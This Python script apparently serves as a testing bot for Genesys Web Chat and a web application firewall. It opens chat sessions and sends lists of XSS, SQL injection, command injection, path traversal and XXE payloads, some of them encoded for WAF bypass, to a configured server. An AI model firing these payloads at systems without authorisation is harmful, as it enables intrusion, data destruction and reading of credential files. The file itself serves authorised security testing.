#!/usr/bin/env python3
"""
Genesys Web Chat Testing Bot
A tool for testing WAF and Genesys Chat with conversation generation and payload testing.
"""

import os
import sys
import json
import time
import logging
import argparse
import requests
import urllib3
from pathlib import Path
from datetime import datetime
from typing import Dict, List, Optional, Any
from dataclasses import dataclass

# Try to load .env file support
try:
    from dotenv import load_dotenv
    load_dotenv()  # Load .env file if present
except ImportError:
    pass  # python-dotenv not installed, skip

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


# ============================================================================
# Configuration and Logging
# ============================================================================

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    datefmt='%H:%M:%S.%f'
)
logger = logging.getLogger(__name__)


@dataclass
class ChatSession:
    """Stores active chat session data."""
    chat_id: str
    secure_key: str
    user_id: str
    alias: str
    transcript_position: int
    base_url: str


# ============================================================================
# Genesys Chat Client (Refactored)
# ============================================================================

class GenesysChatClient:
    """Enhanced Genesys Web Chat v2 API Client for testing."""

    def __init__(
        self,
        server: str,
        service_name: str,
        api_key: str,
        nickname: str = "TestUser",
        first_name: str = "Test",
        last_name: str = "User",
        email: str = "test@example.com",
        subject: str = "Testing",
        initial_text: str = "",
        proxy_http: Optional[str] = None,
        proxy_https: Optional[str] = None,
        verify_ssl: bool = False,
        use_https: bool = True,
        user_agent: str = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Gecko/20100101 Firefox/90.0"
    ):
        """Initialize client with server configuration.

        Args:
            server: Server hostname (e.g., example.com or gms.example.com)
            service_name: Genesys service name (e.g., MyServiceName)
            api_key: API key for authentication
            nickname: User nickname
            first_name: User first name
            last_name: User last name
            email: User email address
            subject: Chat subject
            initial_text: Initial message when starting chat
            proxy_http: HTTP proxy URL
            proxy_https: HTTPS proxy URL
            verify_ssl: Whether to verify SSL certificates
            use_https: Use HTTPS protocol (default: True)
            user_agent: User-Agent header
        """
        # Build full URL from components
        protocol = "https" if use_https else "http"
        self.server_url = f"{protocol}://{server}/genesys/2/chat/{service_name}/"
        self.api_key = api_key
        self.session: Optional[ChatSession] = None
        self.request_count = 0

        # Build request configuration
        self.config = {
            'method': 'POST',
            'url': self.server_url,
            'headers': {
                'Accept': '*/*',
                'apikey': api_key,
                'Accept-Encoding': 'gzip, deflate',
                'Accept-Language': 'en-US,en;q=0.5',
                'Cache-Control': 'no-cache',
                'Content-Type': 'application/x-www-form-urlencoded',
                'User-Agent': user_agent,
                'Sec-Fetch-Site': 'cross-site',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Dest': 'empty'
            },
            'data': {
                'nickname': nickname,
                'firstName': first_name,
                'lastName': last_name,
                'emailAddress': email,
                'subject': subject,
                'text': initial_text,
                'userData[GCTI_LanguageCode]': 'en',
                'userData[_genesys_source]': 'web'
            },
            'verify': verify_ssl
        }

        # Add proxies if specified
        if proxy_http or proxy_https:
            self.config['proxies'] = {}
            if proxy_http:
                self.config['proxies']['http'] = proxy_http
            if proxy_https:
                self.config['proxies']['https'] = proxy_https

    def _make_request(
        self,
        url: str,
        data: Dict[str, Any],
        description: str = ""
    ) -> Optional[Dict[str, Any]]:
        """Make HTTP request to Genesys API.

        Args:
            url: Full URL to request
            data: Form data to send
            description: Description for logging

        Returns:
            JSON response or None on error
        """
        self.request_count += 1

        try:
            # Update request data
            self.config['url'] = url
            self.config['data'] = data

            if description:
                logger.info(f"[{self.request_count}] {description}")

            # Make request
            response = requests.request(**self.config)

            logger.debug(f"Response URL: {response.url}")
            logger.debug(f"Response Status: {response.status_code}")
            logger.debug(f"Response Body: {response.text[:500]}")

            # Check for WAF block
            if response.status_code == 403 or b"Forbidden" in response.content:
                logger.warning(f"⚠️  WAF BLOCKED: {response.content[:200]}")
                return None

            # Parse JSON response
            if response.ok and response.content:
                json_data = response.json()

                # Check API-level errors
                if json_data.get("statusCode", 0) != 0:
                    errors = json_data.get("errors", [])
                    logger.error(f"API Error: {errors}")

                return json_data

            logger.error(f"Request failed: {response.status_code} - {response.text[:200]}")
            return None

        except requests.exceptions.RequestException as e:
            logger.error(f"Request exception: {e}")
            sys.exit(1)
        except json.JSONDecodeError as e:
            logger.error(f"JSON decode error: {e}")
            return None

    def start_chat(self, initial_text: str = "", delay: int = 0) -> bool:
        """Start a new chat session.

        Args:
            initial_text: Initial message to send
            delay: Delay before starting (seconds)

        Returns:
            True if successful, False otherwise
        """
        if delay > 0:
            time.sleep(delay)

        logger.info("=" * 60)
        logger.info(f"🚀 Starting new chat session at {datetime.now().strftime('%H:%M:%S.%f')[:-3]}")
        logger.info("=" * 60)

        # Prepare initial data
        data = self.config['data'].copy()
        if initial_text:
            data['text'] = initial_text

        # Make request
        response = self._make_request(self.server_url, data, "Creating chat session")

        if not response:
            logger.error("❌ Failed to start chat")
            return False

        # Store session data
        self.session = ChatSession(
            chat_id=response['chatId'],
            secure_key=response['secureKey'],
            user_id=response['userId'],
            alias=response['alias'],
            transcript_position=response.get('nextPosition', 0),
            base_url=self.server_url
        )

        logger.info(f"✅ Chat started successfully")
        logger.info(f"   Chat ID: {self.session.chat_id}")
        logger.info(f"   User ID: {self.session.user_id}")

        return True

    def refresh(self, delay: int = 0) -> Optional[List[Dict[str, Any]]]:
        """Refresh chat to get new messages.

        Args:
            delay: Delay before refresh (seconds)

        Returns:
            List of new messages or None
        """
        if not self.session:
            logger.error("No active chat session")
            return None

        if delay > 0:
            time.sleep(delay)

        # Prepare data
        data = {
            'alias': self.session.alias,
            'secureKey': self.session.secure_key,
            'userId': self.session.user_id,
            'transcriptPosition': self.session.transcript_position,
            'message': ''
        }

        # Make request
        url = f"{self.session.base_url}{self.session.chat_id}/refresh"
        response = self._make_request(
            url,
            data,
            f"Refresh (position={self.session.transcript_position})"
        )

        if not response:
            return None

        # Update transcript position
        self.session.transcript_position = response.get('nextPosition', self.session.transcript_position)

        # Get messages
        messages = response.get('messages', [])
        if messages:
            logger.info(f"📬 Received {len(messages)} message(s)")
            for msg in messages:
                self._log_message(msg)

        return messages

    def send_message(self, message: str, delay: int = 0) -> bool:
        """Send a message in the chat.

        Args:
            message: Message text to send
            delay: Delay before sending (seconds)

        Returns:
            True if successful, False otherwise
        """
        if not self.session:
            logger.error("No active chat session")
            return False

        if delay > 0:
            time.sleep(delay)

        # Prepare data
        data = {
            'alias': self.session.alias,
            'secureKey': self.session.secure_key,
            'userId': self.session.user_id,
            'transcriptPosition': self.session.transcript_position,
            'message': message
        }

        # Make request
        url = f"{self.session.base_url}{self.session.chat_id}/send"
        response = self._make_request(
            url,
            data,
            f"💬 Sending: {message[:60]}{'...' if len(message) > 60 else ''}"
        )

        if not response:
            return False

        # Update transcript position
        self.session.transcript_position = response.get('nextPosition', self.session.transcript_position)

        return True

    def disconnect(self) -> bool:
        """Disconnect from chat session.

        Returns:
            True if successful, False otherwise
        """
        if not self.session:
            logger.warning("No active chat session to disconnect")
            return False

        # Prepare data
        data = {
            'alias': self.session.alias,
            'secureKey': self.session.secure_key,
            'userId': self.session.user_id,
            'transcriptPosition': self.session.transcript_position,
            'message': ''
        }

        # Make request
        url = f"{self.session.base_url}{self.session.chat_id}/disconnect"

        try:
            self.config['url'] = url
            self.config['data'] = data
            requests.request(**self.config)
            logger.info("👋 Disconnected from chat")
            self.session = None
            return True
        except Exception as e:
            logger.error(f"Disconnect error: {e}")
            return False

    def _log_message(self, message: Dict[str, Any]) -> None:
        """Log a message event with nice formatting."""
        msg_type = message.get('type', 'Unknown')
        index = message.get('index', '?')

        if msg_type == "Message":
            text = message.get('text', '')
            from_participant = message.get('from', {})
            nickname = from_participant.get('nickname', 'Unknown')
            logger.info(f"   [{index}] {nickname}: {text}")
        elif msg_type == "ParticipantJoined":
            logger.info(f"   [{index}] ✅ Participant joined")
        elif msg_type == "ParticipantLeft":
            logger.info(f"   [{index}] ❌ Participant left")
        elif msg_type == "TypingStarted":
            logger.debug(f"   [{index}] ⌨️  Typing started")
        elif msg_type == "TypingStopped":
            logger.debug(f"   [{index}] ⌨️  Typing stopped")
        else:
            logger.info(f"   [{index}] {msg_type}")


# ============================================================================
# Payload Generators for WAF Testing
# ============================================================================

class PayloadGenerator:
    """Generate various payloads for WAF and security testing."""

    @staticmethod
    def xss_payloads() -> List[str]:
        """Generate XSS test payloads."""
        return [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg/onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "<iframe src='javascript:alert(\"XSS\")'></iframe>",
            "'\"><script>alert(String.fromCharCode(88,83,83))</script>",
            "<script>alert`XSS`</script>",
            "<img src='x' onerror='alert(1)'>",
        ]

    @staticmethod
    def sql_injection_payloads() -> List[str]:
        """Generate SQL injection test payloads."""
        return [
            "' OR '1'='1",
            "1' OR '1'='1' --",
            "admin'--",
            "' UNION SELECT NULL--",
            "1' AND '1'='2",
            "'; DROP TABLE users--",
            "1' UNION SELECT username, password FROM users--",
        ]

    @staticmethod
    def command_injection_payloads() -> List[str]:
        """Generate command injection test payloads."""
        return [
            "; ls -la",
            "| whoami",
            "`id`",
            "$(whoami)",
            "; cat /etc/passwd",
            "& ping -c 5 127.0.0.1",
            "|| echo vulnerable",
        ]

    @staticmethod
    def path_traversal_payloads() -> List[str]:
        """Generate path traversal test payloads."""
        return [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "....//....//....//etc/passwd",
            "..%2f..%2f..%2fetc%2fpasswd",
            "..%252f..%252f..%252fetc%252fpasswd",
        ]

    @staticmethod
    def xxe_payloads() -> List[str]:
        """Generate XXE test payloads."""
        return [
            "<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><foo>&xxe;</foo>",
            "<?xml version='1.0'?><!DOCTYPE data [<!ENTITY file SYSTEM 'file:///c:/windows/win.ini'>]><data>&file;</data>",
        ]

    @staticmethod
    def encoding_variants(payload: str) -> List[str]:
        """Generate encoding variants for WAF bypass.

        Args:
            payload: Base payload to encode

        Returns:
            List of encoded variants
        """
        import urllib.parse

        variants = [
            payload,
            urllib.parse.quote(payload),  # URL encoding
            urllib.parse.quote(urllib.parse.quote(payload)),  # Double encoding
            payload.replace(' ', '%20'),
            payload.replace(' ', '+'),
            payload.replace('<', '%3C').replace('>', '%3E'),
        ]

        return variants

    @staticmethod
    def normal_conversation() -> List[str]:
        """Generate normal conversation messages."""
        return [
            "Hello, I need help with my account",
            "Can you help me reset my password?",
            "What are your business hours?",
            "I have a question about my order",
            "Thank you for your help!",
            "How do I update my profile?",
            "Is there a way to track my shipment?",
            "I'd like to speak with a supervisor",
        ]

    @staticmethod
    def get_all_payloads() -> Dict[str, List[str]]:
        """Get all payload categories.

        Returns:
            Dictionary of payload categories and their payloads
        """
        return {
            'xss': PayloadGenerator.xss_payloads(),
            'sqli': PayloadGenerator.sql_injection_payloads(),
            'cmdi': PayloadGenerator.command_injection_payloads(),
            'path_traversal': PayloadGenerator.path_traversal_payloads(),
            'xxe': PayloadGenerator.xxe_payloads(),
            'normal': PayloadGenerator.normal_conversation(),
        }


# ============================================================================
# Conversation Bot
# ============================================================================

class ConversationBot:
    """Automated conversation bot for testing."""

    def __init__(self, client: GenesysChatClient):
        """Initialize bot with chat client.

        Args:
            client: GenesysChatClient instance
        """
        self.client = client

    def run_from_file(self, file_path: str, delay: int = 2) -> None:
        """Run conversation from a file (one message per line).

        Args:
            file_path: Path to file with messages
            delay: Delay between messages (seconds)
        """
        logger.info(f"📖 Loading conversation from: {file_path}")

        try:
            with open(file_path, 'r', encoding='utf-8') as f:
                messages = [line.strip() for line in f if line.strip()]
        except FileNotFoundError:
            logger.error(f"File not found: {file_path}")
            return

        logger.info(f"Loaded {len(messages)} messages")

        for i, message in enumerate(messages, 1):
            logger.info(f"[{i}/{len(messages)}] Sending message...")
            self.client.send_message(message, delay=delay)
            self.client.refresh(delay=1)

    def run_payload_test(
        self,
        payload_type: str = 'all',
        delay: int = 2,
        stop_on_block: bool = False
    ) -> None:
        """Run automated payload testing.

        Args:
            payload_type: Type of payloads ('xss', 'sqli', 'all', etc.)
            delay: Delay between payloads (seconds)
            stop_on_block: Stop if WAF blocks a payload
        """
        all_payloads = PayloadGenerator.get_all_payloads()

        if payload_type == 'all':
            # Test all payload types
            for category, payloads in all_payloads.items():
                logger.info(f"\n{'='*60}")
                logger.info(f"Testing {category.upper()} payloads ({len(payloads)} payloads)")
                logger.info(f"{'='*60}\n")

                if not self._test_payloads(payloads, delay, stop_on_block):
                    if stop_on_block:
                        break
        else:
            # Test specific payload type
            if payload_type in all_payloads:
                payloads = all_payloads[payload_type]
                logger.info(f"Testing {len(payloads)} {payload_type.upper()} payloads")
                self._test_payloads(payloads, delay, stop_on_block)
            else:
                logger.error(f"Unknown payload type: {payload_type}")
                logger.info(f"Available types: {', '.join(all_payloads.keys())}")

    def _test_payloads(
        self,
        payloads: List[str],
        delay: int,
        stop_on_block: bool
    ) -> bool:
        """Test a list of payloads.

        Args:
            payloads: List of payloads to test
            delay: Delay between payloads
            stop_on_block: Stop on first block

        Returns:
            True if all succeeded, False if blocked
        """
        for i, payload in enumerate(payloads, 1):
            logger.info(f"[{i}/{len(payloads)}] Testing payload...")
            success = self.client.send_message(payload, delay=delay)

            if not success and stop_on_block:
                logger.warning("Stopping due to WAF block")
                return False

            time.sleep(0.5)

        return True

    def interactive_mode(self) -> None:
        """Run in interactive mode (manual message input)."""
        logger.info("\n" + "="*60)
        logger.info("Interactive Mode - Type messages or commands:")
        logger.info("  /refresh - Refresh messages")
        logger.info("  /quit    - Disconnect and quit")
        logger.info("="*60 + "\n")

        while True:
            try:
                message = input("You: ").strip()

                if not message:
                    continue

                if message == '/quit':
                    break
                elif message == '/refresh':
                    self.client.refresh()
                elif message.startswith('/'):
                    logger.warning(f"Unknown command: {message}")
                else:
                    self.client.send_message(message)
                    time.sleep(1)
                    self.client.refresh()

            except (KeyboardInterrupt, EOFError):
                print()
                break


# ============================================================================
# Main Entry Point
# ============================================================================

def main():
    """Main entry point for the bot."""
    parser = argparse.ArgumentParser(
        description='Genesys Web Chat Testing Bot - WAF and Chat Testing Tool',
        epilog='Example: %(prog)s -s gms.example.com --service MyService --api-key YOUR_KEY -m payload -p xss'
    )

    # Server Configuration (Required)
    parser.add_argument(
        '-s', '--server',
        default=None,
        help='Server hostname (e.g., gms.example.com) - can use GENESYS_SERVER env var'
    )

    parser.add_argument(
        '--service',
        default=None,
        help='Service name (e.g., MyServiceName) - can use GENESYS_SERVICE env var'
    )

    parser.add_argument(
        '--api-key',
        default=None,
        help='API key for authentication - can use GENESYS_API_KEY env var'
    )

    parser.add_argument(
        '--use-http',
        action='store_true',
        help='Use HTTP instead of HTTPS (default: HTTPS)'
    )

    # User Configuration
    parser.add_argument(
        '--nickname',
        default='TestUser',
        help='User nickname (default: TestUser)'
    )

    parser.add_argument(
        '--first-name',
        default='Test',
        help='User first name (default: Test)'
    )

    parser.add_argument(
        '--last-name',
        default='User',
        help='User last name (default: User)'
    )

    parser.add_argument(
        '--email',
        default='test@example.com',
        help='User email (default: test@example.com)'
    )

    parser.add_argument(
        '--subject',
        default='Testing',
        help='Chat subject (default: Testing)'
    )

    # Proxy Configuration
    parser.add_argument(
        '--proxy-http',
        help='HTTP proxy URL (e.g., http://127.0.0.1:8080)'
    )

    parser.add_argument(
        '--proxy-https',
        help='HTTPS proxy URL (e.g., http://127.0.0.1:8080)'
    )

    parser.add_argument(
        '--verify-ssl',
        action='store_true',
        help='Enable SSL certificate verification (default: disabled)'
    )

    # Mode selection
    parser.add_argument(
        '-m', '--mode',
        choices=['file', 'payload', 'interactive', 'simple'],
        default='simple',
        help='Operation mode (default: simple)'
    )

    # File mode options
    parser.add_argument(
        '-f', '--file',
        help='File with messages (one per line) for file mode'
    )

    # Payload mode options
    parser.add_argument(
        '-p', '--payload-type',
        choices=['xss', 'sqli', 'cmdi', 'path_traversal', 'xxe', 'normal', 'all'],
        default='all',
        help='Type of payloads to test (default: all)'
    )

    # Timing options
    parser.add_argument(
        '-d', '--delay',
        type=int,
        default=2,
        help='Delay between messages in seconds (default: 2)'
    )

    parser.add_argument(
        '--initial-delay',
        type=int,
        default=0,
        help='Delay before starting chat (default: 0)'
    )

    # Other options
    parser.add_argument(
        '--initial-message',
        default='',
        help='Initial message when starting chat'
    )

    parser.add_argument(
        '-v', '--verbose',
        action='store_true',
        help='Enable verbose debug logging'
    )

    parser.add_argument(
        '--stop-on-block',
        action='store_true',
        help='Stop testing if WAF blocks a payload'
    )

    args = parser.parse_args()

    # Set logging level
    if args.verbose:
        logger.setLevel(logging.DEBUG)

    # Get configuration from args or environment variables
    server = args.server or os.environ.get('GENESYS_SERVER')
    service = args.service or os.environ.get('GENESYS_SERVICE')
    api_key = args.api_key or os.environ.get('GENESYS_API_KEY')

    # Validate required parameters
    if not server:
        logger.error("Server hostname required: use -s or set GENESYS_SERVER environment variable")
        logger.error("Example: -s gms.example.com or export GENESYS_SERVER=gms.example.com")
        sys.exit(1)

    if not service:
        logger.error("Service name required: use --service or set GENESYS_SERVICE environment variable")
        logger.error("Example: --service MyServiceName or export GENESYS_SERVICE=MyServiceName")
        sys.exit(1)

    if not api_key:
        logger.error("API key required: use --api-key or set GENESYS_API_KEY environment variable")
        sys.exit(1)

    # Initialize client
    client = GenesysChatClient(
        server=server,
        service_name=service,
        api_key=api_key,
        nickname=args.nickname,
        first_name=args.first_name,
        last_name=args.last_name,
        email=args.email,
        subject=args.subject,
        initial_text=args.initial_message,
        proxy_http=args.proxy_http,
        proxy_https=args.proxy_https,
        verify_ssl=args.verify_ssl,
        use_https=not args.use_http
    )

    # Log the constructed URL for debugging
    logger.info(f"Connecting to: {client.server_url}")

    # Start chat session
    if not client.start_chat(args.initial_message, delay=args.initial_delay):
        logger.error("Failed to start chat session")
        sys.exit(1)

    # Initial refresh
    client.refresh(delay=2)

    # Run selected mode
    bot = ConversationBot(client)

    try:
        if args.mode == 'file':
            if not args.file:
                logger.error("File mode requires --file argument")
                sys.exit(1)
            bot.run_from_file(args.file, delay=args.delay)

        elif args.mode == 'payload':
            bot.run_payload_test(
                payload_type=args.payload_type,
                delay=args.delay,
                stop_on_block=args.stop_on_block
            )

        elif args.mode == 'interactive':
            bot.interactive_mode()

        elif args.mode == 'simple':
            # Simple mode - send a test message
            client.send_message("Hello from Genesys Test Bot! ¯\\_(ツ)_/¯")
            client.refresh(delay=5)

    except KeyboardInterrupt:
        logger.info("\n⚠️  Interrupted by user")

    finally:
        # Cleanup
        client.disconnect()
        logger.info(f"\n📊 Total requests made: {client.request_count}")
        logger.info("✅ Done!")


if __name__ == '__main__':
    main()
